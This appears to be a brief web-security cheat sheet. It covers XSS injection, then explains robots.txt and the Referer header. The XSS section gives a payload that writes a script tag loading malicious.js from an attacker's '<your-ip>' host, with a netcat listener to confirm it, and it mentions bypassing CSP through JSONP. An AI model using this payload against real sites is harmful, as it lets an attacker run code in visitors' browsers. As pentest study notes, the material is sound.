  A list of useful payloads and bypasses for Web Application Security (e.g. LFI payloads, XSS injection, CSRF injection, etc.)

## How to inject an XSS payload?

1. Make the web server load a script from you. In other words, the XSS attack should inject the following (or similar) payload
    ```js
    document.write('script src="http://<your-ip>/malicious.js"</script>');
    ```
    This method has the benefit that you need no further anti-sanitization for your actual malicious payloads. Anti-sanitization is required only to enter the above JavaScript code.<br/>
    To check if the web server even attempts to load your script, you can always run a `netcat` first with `-lvnp 80`.<br/>
2. Use inline `<script>` tags
3. Use JSONP endpoints to bypass CSP

## robots.txt

A robots.txt file tells search engine crawlers which pages or files the crawler can or can't request from your site. This is used mainly to avoid overloading your site with requests; it is not a mechanism for keeping a web page out of a crawler.

Example: `https://www.google.com/robots.txt`

## `Referer` HTTP Header

The `Referer` request header contains the address of the previous web page from which a link to the currently requested page was followed. The `Referer` header allows servers to identify where people are visiting them from and may use that data for analytics, logging, or optimized caching, for example. ([More here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer))

There are privacy and security risks associated with the Referer HTTP header. For example, consider a "reset password" page with a social media link in a footer. If the link was followed, depending on how information was shared the social media site may receive the reset password URL and may still be able to use the shared information, potentially compromising a user's security.
